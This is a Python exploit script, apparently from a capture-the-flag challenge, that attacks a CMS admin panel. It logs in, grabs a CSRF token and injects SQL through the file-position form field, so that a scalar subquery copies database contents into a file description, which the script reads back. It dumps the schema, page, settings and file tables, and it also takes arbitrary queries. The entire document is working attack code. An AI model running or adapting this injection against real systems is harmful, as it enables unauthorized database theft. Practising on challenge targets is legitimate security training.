#!/usr/bin/env python3
"""attack_the_cms SQLi exfil: dump DB via scalar subquery into sDescription.

Injection (single statement, PDO::query):
  aFilesPositions[fid] = '2", sDescription = (SELECT ...) -- '
Then GET pages-form iPage=1 and read the file description field back.
Dumps: pages table, bin table, files table, sqlite_master, language rows.
"""
import re, sys, time
import requests

BASE = "http://127.0.0.1:8765/"
USER, PASS = "contextgrave-admin@chal.sh", "admin"
PNG = "upcomingevents_01.png"

def sess():
    s = requests.Session()
    s.trust_env = False
    s.headers.update({"User-Agent": "Mozilla/5.0"})
    return s

def login(s):
    r = s.post(BASE + "admin.php?p=login",
               data={"sEmail": USER, "sPass": PASS, "bAcceptLicense": "1", "iAcceptLicense": "true"},
               timeout=25)
    return "p=logout" in r.text

def csrf(s):
    r = s.get(BASE + "admin.php?p=pages-form&iPage=1", timeout=25)
    m = re.search(r'name="sCsrfToken" value="([0-9a-f]+)"', r.text)
    return m.group(1) if m else None

def form(s):
    return s.get(BASE + "admin.php?p=pages-form&iPage=1", timeout=25).text

def rows_ids(html):
    return sorted(int(x) for x in set(re.findall(r'aFilesPositions\[(\d+)\]', html)))

def attach(s, tok):
    data = {"sOption": "save", "sCsrfToken": tok, "sName": "Upcoming Events", "iPage": "1",
            "iStatus": "1", "aDirFiles[0]": PNG, "aDirFilesPositions[0]": "1",
            "aDirFilesTypes[0]": "1", "aDirFilesDescriptions[0]": "p6x"}
    return s.post(BASE + "admin.php?p=pages-form&iPage=1", data=data,
                  timeout=25, allow_redirects=False).status_code

def exfil(s, tok, fid, subquery):
    payload = '2", sDescription = (%s) -- ' % subquery
    data = {"sOption": "save", "sCsrfToken": tok, "sName": "Upcoming Events", "iPage": "1",
            "iStatus": "1", "iChangedFiles": "1", "aFilesDescription[%d]" % fid: "x",
            "aFilesPositions[%d]" % fid: payload}
    rc = s.post(BASE + "admin.php?p=pages-form&iPage=1", data=data, timeout=25,
                allow_redirects=False).status_code
    h = form(s)
    # description is an <input ... value="..."> for each file row
    m = re.search(r'aFilesDescription\[%d\][^>]*value="([^"]*)"' % fid, h)
    if not m:
        m = re.search(r'value="([^"]*)"[^>]*name="aFilesDescription\[%d\]"' % fid, h)
    return rc, (m.group(1) if m else None)

QUERIES = [
    ("sqlite_master", "SELECT GROUP_CONCAT(type||':'||name||'['||COALESCE(sql,'')||']','##') FROM sqlite_master"),
    ("pages", "SELECT GROUP_CONCAT(iPage||':'||sName||'{'||COALESCE(sDescriptionFull,'')||'}','##') FROM pages"),
    ("bin", "SELECT GROUP_CONCAT(sKey||'='||COALESCE(sValue,''),'##') FROM bin"),
    ("files", "SELECT GROUP_CONCAT(iFile||':'||sFileName||'@'||COALESCE(sDescription,''),'##') FROM files"),
    ("flags_grep", "SELECT GROUP_CONCAT(sKey||'='||sValue,'##') FROM bin WHERE sValue LIKE '%hkcert%' OR sKey LIKE '%flag%'"),
]

if __name__ == "__main__":
    if len(sys.argv) > 2 and sys.argv[1] == "-q":
        QUERIES = [("adhoc", sys.argv[2])]
    s = sess()
    if not login(s):
        print("login failed"); sys.exit(1)
    tok = csrf(s)
    ids = rows_ids(form(s))
    if not ids:
        rc = attach(s, tok); ids = rows_ids(form(s))
    if not ids:
        print("no file row to inject through"); sys.exit(1)
    fid = max(ids)
    print("fid =", fid)
    out = {}
    for name, q in QUERIES:
        rc, val = exfil(s, tok, fid, q)
        print("== %s (rc=%s)" % (name, rc))
        print(val if val else "(empty)")
        out[name] = val
    import json
    json.dump(out, open("assets_extracted/cms_fresh/sqli_dump.json", "w"))
    print("saved sqli_dump.json")
